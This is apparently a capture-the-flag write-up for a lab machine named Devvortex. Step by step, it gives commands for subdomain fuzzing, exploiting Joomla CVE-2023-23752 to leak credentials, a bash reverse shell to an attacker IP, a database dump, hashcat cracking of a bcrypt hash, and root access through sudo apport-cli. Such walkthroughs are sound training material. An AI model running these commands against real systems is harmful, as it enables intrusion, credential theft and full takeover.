
Starts with an nmap of our ip address

```
nmap -sC -sV {ip of target}
```

Add ip to hosts list:

```
echo "{target ip} devvortex.htb" | sudo tee -a /etc/hosts
```

I used gobuster with some issues, but the writeup used ffuf with success, so I will detail that here:

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-
top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -
t 100
```

Add the subdomain to the hosts list:

```
echo "10.129.228.37 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

Fuzz directories:

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://dev.devvortex.htb/FFUZ -ic  -t 100
```

We find an administrator endpoint which is running Joomla. In `/administrator/manifests/files/joola.xml` we find version number `4.2.6`.

There is the vulnerability CVE-2023-23752, to exploit this we send a GET requests to an endpoint using curl.

```
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv
```

We get the credentials `lewis:P4ntherg0t1n5r3c0n##`

In Joomla go to `System>Site Templates > Cassiopedia Details and Files > error.php`

Add this php code to the bottom of the error.php file

On our local box we create a reverse shell,

```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
```

Create a webserver in the same directory:

```
python3 -m http.server 8080
```

Start a netcat listener:

```
nc -lnvp 4444
```

Then send a curl from our local triggering the error.php

```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

This gives access to the victim's box, and we use this command to get us a better shell:

```
script /dev/null -c bash
```

We use lewis' credentials to get us access to mysql:

```
mysql -u lewis -p
```

Commands to run against the db:

```
use joomla
select * from sd4fg_users;
```

We get the following hash from the db as pw

```
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
```

Which returns as a bcrypt hash, we use hashcat to get the password, tequieromucho

```
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

We ssh into logan, and obtain the user flag.

For privilege escalation run `sudo l` to find what files we can run as sudo.

```
$sudo -l

/usr/bin/apport-cli

$ /usr/bin/apport-cli --version

2.20.11
```

There is a vulnerability apport-cli, which is a command line tool for reporting and analyzing app crashes on Ubuntu and Debian linux distros.

We run `ps -ux` to to find the pid of `/lib/systemd/systemmd --user` 

Then we run:

```
sudo /usr/bin/apport-cli -f -P 4576
```

This gets us root, file is in `/root/root.txt`

